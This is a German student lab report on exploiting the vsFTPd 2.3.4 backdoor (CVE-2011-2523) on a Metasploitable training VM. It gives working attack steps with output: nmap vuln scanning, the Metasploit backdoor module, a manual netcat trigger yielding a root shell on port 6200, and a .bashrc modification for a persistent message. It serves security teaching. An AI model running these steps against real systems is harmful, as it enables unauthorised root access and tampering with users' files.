# Übung Metasploit – vsFTPd Backdoor

**Klasse:** 4 AHITS
**Name:** Martin Haberl
**Fach:** ITSE4 – Übungen
**Datum:** 19.01.2026

---

## 1) Ziel der Übung

Ziel dieser Übung ist es, mithilfe von **nmap** und dem **Metasploit Framework** eine bekannte Sicherheitslücke im FTP-Dienst **vsFTPd Version 2.3.4** auf der Metasploitable-VM zu identifizieren und auszunutzen. Dabei sollen grundlegende Metasploit-Befehle erlernt, Scanner-Module verwendet, ein Exploit ausgeführt und anschließend der erfolgreiche Zugriff verifiziert werden.

---

## 2) Grundlagen: Metasploit

Metasploit ist ein umfassender Werkzeugkasten für Penetration-Tester und Sicherheitsforscher. Mit Metasploit können unter anderem:

* Schwachstellen gesucht und analysiert werden
* Exploits ausgeführt werden
* Payloads erzeugt werden (z. B. mit msfvenom)
* Nach einem erfolgreichen Einbruch weitere Analysen durchgeführt werden (Meterpreter)

Start von Metasploit:

```sh
msfconsole
```

---

## 3) Metasploit Cheatsheet (Kurzfassung)

| Befehl                 | Beschreibung                     |
| ---------------------- | -------------------------------- |
| `help`                 | Hilfe anzeigen                   |
| `search <begriff>`     | Nach Modulen suchen              |
| `use <modul>`          | Modul aktivieren                 |
| `info`                 | Informationen zum Modul anzeigen |
| `options`              | Moduloptionen anzeigen           |
| `set <option> <wert>`  | Option setzen                    |
| `setg <option> <wert>` | Option global setzen             |
| `run` / `exploit`      | Modul ausführen                  |
| `back`                 | Modul verlassen                  |
| `exit`                 | Metasploit beenden               |

### setg (set global)

Der Befehl `setg` setzt Optionen global für alle Module. Dadurch muss z. B. die Ziel-IP nicht bei jedem Modul neu gesetzt werden.

Beispiel:

```sh
setg RHOSTS 192.168.5.51
```

---

## 4) Nmap Vulnerability Scan auf FTP

Der FTP-Dienst verwendet standardmäßig **TCP-Port 21**.

### Scan-Befehl:

```sh
nmap -p 21 --script=vuln 192.168.5.51
```

### Ergebnis:

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -p 21 --script=vuln 192.168.5.51
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-19 06:48 EST
Nmap scan report for 192.168.5.51
Host is up (0.00091s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  BID:48539
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://www.securityfocus.com/bid/48539
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
MAC Address: 00:0C:29:26:B9:F5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds
```
CVE-Nummer

CVE-2011-2523

Diese Sicherheitslücke beschreibt eine absichtlich eingebaute Backdoor in der offiziellen Version von vsFTPd 2.3.4.

Interpretation:

Die mit --script=vuln ausgeführten Skripte gelten als intrusive, da sie aktiv versuchen, Schwachstellen auszunutzen oder ungewöhnliche Anfragen an den Dienst zu senden. Aus diesem Grund werden diese Skripte nicht automatisch mit -sC oder -A ausgeführt.


---

## 5) FTP-Version mit Metasploit ermitteln

Zur Ermittlung der FTP-Version wird ein Scanner-Modul aus der Kategorie `auxiliary/scanner` verwendet.

### Modul:

```sh
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.5.51
run
```

### Ergebnis:

```sh
msf > use auxiliary/scanner/ftp/ftp_version
msf auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.5.51
RHOSTS => 192.168.5.51
msf auxiliary(scanner/ftp/ftp_version) > run
[+] 192.168.5.51:21       - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a'
[*] 192.168.5.51:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ftp/ftp_version) > 
```

---

## 6) Ausnutzung der vsFTPd Backdoor mit Metasploit

### Voraussetzungen:

* Kali Linux und Metasploitable im **NAT-Modus**
* Metasploit gestartet (`msfconsole`)

### Exploit suchen:

```sh
search vsftpd
```

### Exploit auswählen:

```sh
use exploit/unix/ftp/vsftpd_234_backdoor
```

Nach der Aktivierung erscheint folgende Meldung:

```sh
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Optionen setzen und Exploit ausführen:

```sh
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.5.51
RHOSTS => 192.168.5.51
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 192.168.5.51:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.5.51:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 192.168.5.51:21 - The port used by the backdoor bind listener is already open
[+] 192.168.5.51:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.5.52:35823 -> 192.168.5.51:6200) at 2026-01-19 06:58:05 -0500

id
uid=0(root) gid=0(root)

```

### Ergebnis:

Es wird eine Shell auf dem Zielsystem geöffnet. Diese Shell läuft direkt auf dem Metasploitable-System.

### Rechte der Shell:

Die Shell läuft mit **root-Rechten**, was eine vollständige Kompromittierung des Systems bedeutet.

---

## 7) Persistente Nachricht für den User msfadmin

Um beim nächsten Login eine Nachricht anzuzeigen, wird folgende Nachricht hinterlassen:

```sh
echo "you have been hacked!" >> /home/msfadmin/.bashrc
```

Beim nächsten Login des Benutzers `msfadmin` wird diese Nachricht automatisch angezeigt.

---


## 8) Exploit ohne Metasploit

Die vsFTPd-Backdoor kann auch ohne Metasploit ausgenutzt werden.

### Vorgehensweise:

* Recherche in der Exploit Database
* Analyse eines vorhandenen Python-Skripts
* Manuelles Nachstellen mit `nc` (netcat)

Beispiel:

```sh
──(kali㉿kali)-[~]
└─$ nc 192.168.5.51 21
220 (vsFTPd 2.3.4)

USER
331 Please specify the password.
USER msfadmin
331 Please specify the password.
msfadmin
530 Please login with USER and PASS.
USER test:)    
331 Please specify the password.
PASS test

^C
                                                                             
┌──(kali㉿kali)-[~]
└─$ nc 192.168.5.51 6200

id
uid=0(root) gid=0(root)
```

Durch das Senden eines speziell präparierten Login-Strings kann die Backdoor ausgelöst und eine Shell geöffnet werden.

---
